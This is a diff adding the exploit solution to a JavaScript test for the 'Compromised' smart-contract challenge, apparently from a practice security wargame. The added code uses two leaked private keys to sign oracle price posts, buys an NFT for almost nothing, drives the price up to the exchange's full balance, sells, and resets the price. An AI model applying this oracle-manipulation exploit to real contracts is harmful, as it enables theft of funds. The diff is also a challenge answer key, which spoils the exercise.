@@ -61,6 +61,39 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // hex -> ASCII -> base64 -> priv_key
+        const privateKeys = [
+            "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+            "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        ];
+        const compromisedSigners = privateKeys.map(
+            pk => new ethers.Wallet(pk, ethers.provider)
+        );
+
+        const nftTargetPrice = ethers.utils.parseEther("0.001337");
+
+        // lower price
+        for(const compromisedSigner of compromisedSigners) {
+            await this.oracle.connect(compromisedSigner).postPrice("DVNFT", nftTargetPrice);
+        }
+        // buy one NFT for nothing 
+        await this.exchange.connect(attacker).buyOne({value: nftTargetPrice});
+       // raise median price to 9990
+        for(const compromisedSigner of compromisedSigners) {
+            await this.oracle.connect(compromisedSigner).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(nftTargetPrice));
+        }
+        // sell
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+        await this.exchange.connect(attacker).sellOne(0);
+        // reset price
+        for(const compromisedSigner of compromisedSigners) {
+            await this.oracle.connect(compromisedSigner).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        }
+
+        // console.log({
+        //     attacker: await ethers.provider.getBalance(attacker.address),
+        //     exchange: await ethers.provider.getBalance(this.exchange.address)
+        // });
     });
 
     after(async function () {
